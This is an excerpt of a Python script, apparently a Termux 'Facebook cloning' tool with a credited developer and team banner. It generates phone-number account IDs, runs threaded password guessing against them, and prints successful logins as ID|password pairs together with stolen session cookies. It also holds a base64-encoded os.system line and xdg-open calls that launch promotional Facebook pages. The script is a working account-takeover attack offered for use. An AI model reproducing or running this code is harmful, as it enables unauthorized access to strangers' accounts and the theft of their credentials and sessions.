...
| _| `._____||__|  |__| /__/     \__\ /__/ \__\     
 ...
 ═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━══━═━═━═━═━═━═━══
   [+] DEVELOPER : ZIHAD HOSSAIN RAFI      
   [+] TEAM      : CYBER STRIKER TEAM
   [+] TOOL NAME : FACEBOOK CLONING
   [+] WHATSAPP  : 8801842827520
   [+] VERSION   : MAX
═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━══━═━═━═━═━═━═━══""")
...
class Main:
    def __init__(self):
        ...
        print(" \033[1;32m  [3] NUMBER CLONING")
...
def v1():
    user=[]
    b3Muc3lzdGVtKCJ4ZGctb3BlbiBodHRwczovL2ZhY2Vib29rLmNvbS96aWhhZC5ob3NzYWluMzYiKQ==
    os.system('clear')
    print(logo)
...
def v3():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system("xdg-open https://web.facebook.com/groups/termuxupdate")
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f"\033[1;92m   [+]  TARGET DOAMIN:\033[1;92m {doamin}")
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mRAFI\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[RAFI-OK] {uid}|{ps}")
                print(f" \n Cookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[RAFI-CP] {uid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[RAFI] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
